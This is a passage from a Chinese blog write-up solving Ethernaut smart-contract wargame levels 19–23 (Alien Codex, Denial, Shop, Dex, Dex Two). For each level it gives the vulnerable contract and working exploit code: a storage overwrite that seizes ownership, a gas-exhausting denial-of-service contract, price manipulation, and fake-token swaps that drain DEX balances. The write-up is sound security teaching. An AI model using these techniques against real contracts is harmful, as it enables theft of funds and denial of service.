href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable.sol">Ownable.sol</a> 合约，同时也引入了一个 <strong>owner</strong> 变量</p><p>由于 EVM 存储优化的关系，在 slot [0]中同时存储了contact和owner，需要做的就是将owner变量覆盖为自己。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">await</span> web3.eth.getStorageAt(instance, <span class="hljs-number">0</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">x, y</span>) </span>&#123;<span class="hljs-built_in">console</span>.info(y)&#125;);<br><span class="hljs-comment">// 0x000000000000000000000000da5b3fb76c78b6edee6be8f11a1c31ecfb02b272 slot0</span><br><span class="hljs-comment">// 对应的 contact 为零,Owner=0xda5b3fb76c78b6edee6be8f11a1c31ecfb02b272</span><br></code></pre></td></tr></table></figure></li><li><p>数组 <strong>codex</strong> 的 <code>slot</code> 为 <code>1</code> ，同时这也是存储数组 <strong>length</strong> 的地方，而 <strong>codex</strong> 的实际内容存储在 <code>keccak256(bytes32(1))</code> 开始的位置</p><ul><li>参考 <a href="https://www.freebuf.com/articles/blockchain-articles/177260.html">Solidity中各种变量的存储方式</a></li></ul></li><li><p>因为总共有 <strong>2^256</strong> 个 <code>slot</code> ，要修改 <strong>slot 0</strong> ，假设 <strong>codex</strong> 实际所在 <code>slot x</code> ，(对于本题来说，数组的 <code>slot</code>是 <code>1</code> ， x=keccak256(bytes32(1))) ，那么当我们修改 <strong>codex[y],(y=2^256-x+0)</strong> 时就能修改 <strong>slot 0</strong> ，从而修改 <strong>owner</strong></p><ul><li><p>给位于数组相对的位置赋值</p></li><li><p>我们要修改 <strong>codex[y]</strong> ，那就要满足 <code>y &lt; codex.length</code> ，而这个时候 <strong>codex.length =0</strong> ，但是我们可以通过 <strong>retract()</strong> 使 <code>length</code> 下溢，然后就可以操纵 <strong>codex[y]</strong> 了</p></li></ul></li><li><p>调用任何函数都需要绕过修饰关键词contacted的限制，也就是需要使contact = true，那就是调用make_contact() 函数</p></li></ul><h3 id="攻击流程-6"><a href="#攻击流程-6" class="headerlink" title="攻击流程"></a>攻击流程</h3><ol><li><p>先调用 <code>make_contact</code> 函数</p><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220307215241130.png" alt="image-20220307215241130"></p></li><li><p>计算codex 的位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.18;<br>contract test &#123;<br>function go() view returns(bytes32)&#123;<br>   return keccak256((bytes32(1)));<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220307215852291.png" alt="image-20220307215852291"></p><p>即 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6</p></li><li><p>y = 2^256-x+0 = 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a</p></li><li><p>通过 <code>retract()</code> 使得 <strong>codex</strong> 数组 <code>length</code> 下溢，使其满足 <strong>y &lt; codex.length</strong></p></li><li><p>将 <strong>owner</strong> 换成 <strong>player</strong> 地址即可</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">await</span> contract.owner()<br><span class="hljs-comment">// &quot;0xda5b3Fb76C78b6EdEE6BE8F11a1c31EcfB02b272&quot;</span><br>contract.revise(<span class="hljs-string">&#x27;0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a&#x27;</span>,<span class="hljs-string">&quot;0x0000000000000000000000019DC97146b924263A2c8C7237FbeEAFb6ef60b624&quot;</span>)<br><span class="hljs-comment">// 调用 revise()</span><br><span class="hljs-keyword">await</span> contract.owner()<br><span class="hljs-comment">// &#x27;0x9DC97146b924263A2c8C7237FbeEAFb6ef60b624&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220307223654117.png" alt="image-20220307223654117"></p></li></ol><h2 id="20-Denial"><a href="#20-Denial" class="headerlink" title="20. Denial"></a>20. Denial</h2><h3 id="闯关要求-7"><a href="#闯关要求-7" class="headerlink" title="闯关要求"></a>闯关要求</h3><p>这是一个简单的钱包，会随着时间的推移而流失资金。您可以成为提款伙伴，慢慢提款。</p><p>如果您可以在所有者调用withdraw() 时拒绝提取资金（而合约仍有资金，并且交易的gas 为1M 或更少），您将赢得此级别。</p><p>即造成DOS使得合约的owner在调用withdraw时无法正常提取资产。</p><h3 id="合约代码-7"><a href="#合约代码-7" class="headerlink" title="合约代码"></a>合约代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;<br><br>contract Denial &#123;<br><br>    using SafeMath for uint256;<br>    address public partner; // withdrawal partner - pay the gas, split the withdraw<br>    address payable public constant owner = address(0xA9E);<br>    uint timeLastWithdrawn;<br>    mapping(address =&gt; uint) withdrawPartnerBalances; // keep track of partners balances<br><br>    function setWithdrawPartner(address _partner) public &#123;<br>        partner = _partner;<br>    &#125;<br><br>    // withdraw 1% to recipient and 1% to owner<br>    function withdraw() public &#123;<br>        uint amountToSend = address(this).balance.div(100);<br>        // perform a call without checking return<br>        // The recipient can revert, the owner will still get their share<br>        partner.call&#123;value:amountToSend&#125;(&quot;&quot;);<br>        owner.transfer(amountToSend);<br>        // keep track of last withdrawal time<br>        timeLastWithdrawn = now;<br>        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);<br>    &#125;<br><br>    // allow deposit of funds<br>    receive() external payable &#123;&#125;<br><br>    // convenience function<br>    function contractBalance() public view returns (uint) &#123;<br>        return address(this).balance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="合约分析-7"><a href="#合约分析-7" class="headerlink" title="合约分析"></a>合约分析</h3><ul><li>可以使 <code>transfer</code> 失败，也就是把 <code>gas</code> 耗光<ul><li>使用 <code>assert</code> 失败的话，将会 <code>spend all gas</code> ，这样的话 <code>owner.transfer(amountToSend)</code> 将执行失败</li><li>重入漏洞 <code>partner.call.value(amountToSend)()</code> ，利用重入漏洞把 <code>gas</code> 消耗完</li></ul></li></ul><h3 id="攻击流程-7"><a href="#攻击流程-7" class="headerlink" title="攻击流程"></a>攻击流程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.6.0;<br><br>import &quot;@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol&quot;;<br><br>contract Denial &#123;<br><br>    using SafeMath for uint256;<br>    address public partner; // withdrawal partner - pay the gas, split the withdraw<br>    address payable public constant owner = address(0xA9E);<br>    uint timeLastWithdrawn;<br>    mapping(address =&gt; uint) withdrawPartnerBalances; // keep track of partners balances<br><br>    function setWithdrawPartner(address _partner) public &#123;<br>        partner = _partner;<br>    &#125;<br><br>    // withdraw 1% to recipient and 1% to owner<br>    function withdraw() public &#123;<br>        uint amountToSend = address(this).balance.div(100);<br>        // perform a call without checking return<br>        // The recipient can revert, the owner will still get their share<br>        partner.call&#123;value:amountToSend&#125;(&quot;&quot;);<br>        owner.transfer(amountToSend);<br>        // keep track of last withdrawal time<br>        timeLastWithdrawn = now;<br>        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);<br>    &#125;<br><br>    // allow deposit of funds<br>    receive() external payable &#123;&#125;<br><br>    // convenience function<br>    function contractBalance() public view returns (uint) &#123;<br>        return address(this).balance;<br>    &#125;<br>&#125;<br><br>contract exploit1 &#123;<br>    address payable instance_add = 0x015307cCEE55050ae6743c019aDc847ae32c6efA;<br>    Denial denial = Denial(instance_add);<br><br>    function attack() public &#123;<br>        denial.setWithdrawPartner(address(this));<br>        denial.withdraw();<br>    &#125;<br><br>    fallback() payable external&#123;<br>        assert(0==1);<br>    &#125;<br>&#125;<br><br>contract exploit2 &#123;<br>    address payable instance_add = 0xE8E0615aA560F06D0361Abb92c11230DC2671b59;<br><br>    function attack() public &#123;<br>        instance_add.call(abi.encodeWithSignature(&quot;setWithdrawPartner(address)&quot;,this));<br>        instance_add.call(abi.encodeWithSignature(&quot;withdraw()&quot;)); <br>    &#125;<br><br>    fallback() payable external&#123;<br>        instance_add.call(abi.encodeWithSignature(&quot;withdraw()&quot;)); <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220308223509185.png" alt="image-20220308223509185"></p><h2 id="21-Shop"><a href="#21-Shop" class="headerlink" title="21. Shop"></a>21. Shop</h2><h3 id="闯关要求-8"><a href="#闯关要求-8" class="headerlink" title="闯关要求"></a>闯关要求</h3><p>从商店以低于要求的价格购买商品</p><h3 id="合约代码-8"><a href="#合约代码-8" class="headerlink" title="合约代码"></a>合约代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>interface Buyer &#123;<br>  function price() external view returns (uint);<br>&#125;<br><br>contract Shop &#123;<br>  uint public price = 100;<br>  bool public isSold;<br><br>  function buy() public &#123;<br>    Buyer _buyer = Buyer(msg.sender);<br><br>    if (_buyer.price() &gt;= price &amp;&amp; !isSold) &#123;<br>      isSold = true;<br>      price = _buyer.price();<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="合约分析-8"><a href="#合约分析-8" class="headerlink" title="合约分析"></a>合约分析</h3><p>类似题目 Elevator</p><h3 id="攻击流程-8"><a href="#攻击流程-8" class="headerlink" title="攻击流程"></a>攻击流程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.6.0;<br><br>interface Buyer &#123;<br>  function price() external view returns (uint);<br>&#125;<br><br>contract Shop &#123;<br>  uint public price = 100;<br>  bool public isSold;<br><br>  function buy() public &#123;<br>    Buyer _buyer = Buyer(msg.sender);<br><br>    if (_buyer.price() &gt;= price &amp;&amp; !isSold) &#123;<br>      isSold = true;<br>      price = _buyer.price();<br>    &#125;<br>  &#125;<br>&#125;<br><br>contract exploit &#123;<br>    address instance_add = 0xB91785ecbbC89B9AEEDb41890bACfAa7C6C39467;<br>    Shop shop = Shop(instance_add);<br><br>    function price() external view returns (uint) &#123;<br>        return Shop(msg.sender).isSold() == true ? 99 : 100;<br>    &#125;<br><br>    function attack() public &#123;<br>        shop.buy();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220309133454833.png" alt="image-20220309133454833"></p><h2 id="22-Dex"><a href="#22-Dex" class="headerlink" title="22. Dex"></a>22. Dex</h2><h3 id="闯关要求-9"><a href="#闯关要求-9" class="headerlink" title="闯关要求"></a>闯关要求</h3><p>此级别的目标是让您破解下面的基本 DEX 合约并通过价格操纵窃取资金。</p><p>您将从 token1 的 10 个令牌和 token2 的 10 个令牌开始。 DEX 合约以每个代币 100 个开始。</p><p>如果您设法从合约中取出所有 2 个代币中的至少 1 个，并允许合约报告资产的“坏”价格，您将在此级别上取得成功。 </p><h3 id="合约代码-9"><a href="#合约代码-9" class="headerlink" title="合约代码"></a>合约代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>import &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;<br>import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;<br>import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;<br><br>contract Dex  &#123;<br>  using SafeMath for uint;<br>  address public token1;<br>  address public token2;<br>  constructor(address _token1, address _token2) public &#123;<br>    token1 = _token1;<br>    token2 = _token2;<br>  &#125;<br><br>  function swap(address from, address to, uint amount) public &#123;<br>    require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;);<br>    require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);<br>    uint swap_amount = get_swap_price(from, to, amount);<br>    IERC20(from).transferFrom(msg.sender, address(this), amount);<br>    IERC20(to).approve(address(this), swap_amount);<br>    IERC20(to).transferFrom(address(this), msg.sender, swap_amount);<br>  &#125;<br><br>  function add_liquidity(address token_address, uint amount) public&#123;<br>    IERC20(token_address).transferFrom(msg.sender, address(this), amount);<br>  &#125;<br><br>  function get_swap_price(address from, address to, uint amount) public view returns(uint)&#123;<br>    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));<br>  &#125;<br><br>  function approve(address spender, uint amount) public &#123;<br>    SwappableToken(token1).approve(spender, amount);<br>    SwappableToken(token2).approve(spender, amount);<br>  &#125;<br><br>  function balanceOf(address token, address account) public view returns (uint)&#123;<br>    return IERC20(token).balanceOf(account);<br>  &#125;<br>&#125;<br><br>contract SwappableToken is ERC20 &#123;<br>  constructor(string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) &#123;<br>        _mint(msg.sender, initialSupply);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="合约分析-9"><a href="#合约分析-9" class="headerlink" title="合约分析"></a>合约分析</h3><p>有两种方法</p><ol><li><p>利用 <code>get_swap_price</code> 中的汇率</p><p><code>get_swap_price</code> 是确定 Dex 中代币之间汇率的方法。其中的除法并不总是计算为一个完美的整数，而是一个分数。Solidity 中没有分数类型。所以会有<code>3 / 2 = 1</code> 的情况出现</p><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/7B6FB5F9CF1BF9AB445A37251DB0CEAA.jpg" alt="img"></p></li><li><p>新建 <code>token3</code> 换取 <code>token1</code> 即可</p></li></ol><h3 id="攻击流程-9"><a href="#攻击流程-9" class="headerlink" title="攻击流程"></a>攻击流程</h3><ol><li><p>跳入控制台。首先批准合同以转移您的代币，并提供足够大的限额，这样我们就不必一次又一次地批准。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">await</span> contract.approve(contract.address, <span class="hljs-number">500</span>)<br></code></pre></td></tr></table></figure><p>获取令牌地址：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js">t1 = <span class="hljs-keyword">await</span> contract.token1()<br>t2 = <span class="hljs-keyword">await</span> contract.token2()<br></code></pre></td></tr></table></figure><p>现在对上面的表行一一对应执行 7 次交换：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">await</span> contract.swap(t1, t2, <span class="hljs-number">10</span>)<br><span class="hljs-keyword">await</span> contract.swap(t2, t1, <span class="hljs-number">20</span>)<br><span class="hljs-keyword">await</span> contract.swap(t1, t2, <span class="hljs-number">24</span>)<br><span class="hljs-keyword">await</span> contract.swap(t2, t1, <span class="hljs-number">30</span>)<br><span class="hljs-keyword">await</span> contract.swap(t1, t2, <span class="hljs-number">41</span>)<br><span class="hljs-keyword">await</span> contract.swap(t2, t1, <span class="hljs-number">45</span>)<br></code></pre></td></tr></table></figure><p>通过以下方式验证：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">await</span> contract.balanceOf(t1, instance).then(<span class="hljs-function"><span class="hljs-params">v</span> =&gt;</span> v.toString())<br><br><span class="hljs-comment">// Output: &#x27;0&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220310221300541.png" alt="image-20220310221300541"></p></li><li><p>代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity 0.6.0;<br><br>contract MyERC20Token &#123;<br>    address hacker = 0x9DC97146b924263A2c8C7237FbeEAFb6ef60b624;<br>    address target = 0x1352D4d6EbA9aDcb4827765DC93a877588d8bd33;<br>    <br>    function balanceOf(address account) public view returns (uint256) &#123;<br>        if (account == hacker || account == target) &#123;<br>            return 1;<br>        &#125; else &#123;<br>            return 1;<br>        &#125;<br>    &#125;<br><br>    function transferFrom(address, address, uint256) public returns (bool) &#123;<br>        return true;<br>    &#125;<br>&#125;<br><br>interface Dex &#123;<br>    function swap(address, address, uint) external;<br>&#125;<br><br>contract exploit &#123;<br>    address token3 = address(new MyERC20Token());<br>    Dex dex = Dex(0x1352D4d6EbA9aDcb4827765DC93a877588d8bd33);<br>    address token1 = 0xd3752A3Aec6d7f94a94aA78E8651bb490d44d97D;<br>    address token2 = 0x190353BB8118e70aFB739c477f5b4ff1dB624eAD;<br>    <br>    constructor() public &#123;<br>        dex.swap(token3,token2,1);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h2 id="23-Dex-Two"><a href="#23-Dex-Two" class="headerlink" title="23. Dex Two"></a>23. Dex Two</h2><h3 id="闯关要求-10"><a href="#闯关要求-10" class="headerlink" title="闯关要求"></a>闯关要求</h3><p>此级别将要求您以不同的方式打破 DexTwo，这是对前一级别进行了细微修改的 Dex 合约。</p><p>您需要从 DexTwo 合约中耗尽 token1 和 token2 的所有余额才能在此级别上取得成功。</p><p>您仍将从 token1 的 10 个令牌和 token2 的 10 个令牌开始。 DEX 合约仍然以每个代币 100 个开始。</p><h3 id="合约代码-10"><a href="#合约代码-10" class="headerlink" title="合约代码"></a>合约代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>import &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;<br>import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;<br>import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;<br><br>contract DexTwo  &#123;<br>  using SafeMath for uint;<br>  address public token1;<br>  address public token2;<br>  constructor(address _token1, address _token2) public &#123;<br>    token1 = _token1;<br>    token2 = _token2;<br>  &#125;<br><br>  function swap(address from, address to, uint amount) public &#123;<br>    require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);<br>    uint swap_amount = get_swap_amount(from, to, amount);<br>    IERC20(from).transferFrom(msg.sender, address(this), amount);<br>    IERC20(to).approve(address(this), swap_amount);<br>    IERC20(to).transferFrom(address(this), msg.sender, swap_amount);<br>  &#125;<br><br>  function add_liquidity(address token_address, uint amount) public&#123;<br>    IERC20(token_address).transferFrom(msg.sender, address(this), amount);<br>  &#125;<br><br>  function get_swap_amount(address from, address to, uint amount) public view returns(uint)&#123;<br>    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));<br>  &#125;<br><br>  function approve(address spender, uint amount) public &#123;<br>    SwappableTokenTwo(token1).approve(spender, amount);<br>    SwappableTokenTwo(token2).approve(spender, amount);<br>  &#125;<br><br>  function balanceOf(address token, address account) public view returns (uint)&#123;<br>    return IERC20(token).balanceOf(account);<br>  &#125;<br>&#125;<br><br>contract SwappableTokenTwo is ERC20 &#123;<br>  constructor(string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) &#123;<br>        _mint(msg.sender, initialSupply);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="合约分析-10"><a href="#合约分析-10" class="headerlink" title="合约分析"></a>合约分析</h3><p>与Dex同理</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code">          DEX             |          player  </span><br><span class="hljs-section">token1 - token2 - token3  | token1 - token2 - token3</span><br><span class="hljs-section">-----------------------------------------------------</span><br><span class="hljs-code">  100     100      100    |   10      10      300</span><br><span class="hljs-code">  0       100      200    |   110     10      200</span><br><span class="hljs-code">  0       0        400    |   110     110     0</span><br></code></pre></td></tr></table></figure><h3 id="攻击流程-10"><a href="#攻击流程-10" class="headerlink" title="攻击流程"></a>攻击流程</h3><p>创建token3</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.8.0;<br><br>import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;<br><br>contract Token3 is ERC20 &#123;<br>    constructor(uint256 initialSupply) ERC20(&quot;Token3&quot;, &quot;t3&quot;) &#123;<br>        _mint(msg.sender, initialSupply);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>指定地址</p><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220311152621066.png" alt="image-20220311152621066"></p><p>向合约中的t3打入100，并批准合同以转移代币</p><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220311152722301.png" alt="image-20220311152722301"></p><p>实例中也需要批准</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">await</span> contract.approve(contract.address, <span class="hljs-number">500</span>)<br></code></pre></td></tr></table></figure><p>检查余额</p><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220311152856176.png" alt="image-20220311152856176"></p><p>依次执行</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">await</span> contract.swap(t3, t1, <span class="hljs-number">100</span>)<br><span class="hljs-keyword">await</span> contract.swap(t3, t2, <span class="hljs-number">200</span>)<br></code></pre></td></tr></table></figure><p>再次检查余额</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 